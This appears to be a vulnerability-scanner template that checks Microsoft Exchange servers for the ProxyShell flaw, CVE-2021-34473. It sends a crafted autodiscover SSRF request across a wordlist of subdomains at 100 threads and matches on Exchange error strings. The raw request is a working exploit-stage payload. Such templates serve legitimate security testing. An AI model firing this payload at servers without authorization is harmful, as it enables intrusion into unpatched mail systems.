id: CVE-2021-34473 1
info:
  author: arcc,intx0x80,dwisiswant0,r3dg33k
  description: 'Microsoft Exchange Server Remote Code Execution Vulnerability This
    CVE ID is unique from CVE-2021-31196, CVE-2021-31206.

    '
  name: Exchange Server SSRF (ProxyShell)
  reference:
  - https://msrc.microsoft.com/update-guide/vulnerability/CVE-2021-34473
  - https://blog.orange.tw/2021/08/proxylogon-a-new-attack-surface-on-ms-exchange-part-1.html
  - https://peterjson.medium.com/reproducing-the-proxyshell-pwn2own-exploit-49743a4ea9a1
  severity: critical
  tags: cve,cve2021,ssrf,rce,exchange
requests:
- attack: sniper
  matchers:
  - condition: or
    part: body
    type: word
    words:
    - Microsoft.Exchange.Clients.Owa2.Server.Core.OwaADUserNotFoundException
    - Exchange MAPI/HTTP Connectivity Endpoint
  payloads:
    Subdomains: /home/mahmoud/Wordlist/AllSubdomains.txt
  raw:
  - 'GET /autodiscover/autodiscover.json?@test.com/owa/?&Email=autodiscover/autodiscover.json%3F@test.com
    HTTP/1.1

    Host: {{Subdomains}}

    '
  threads: 100
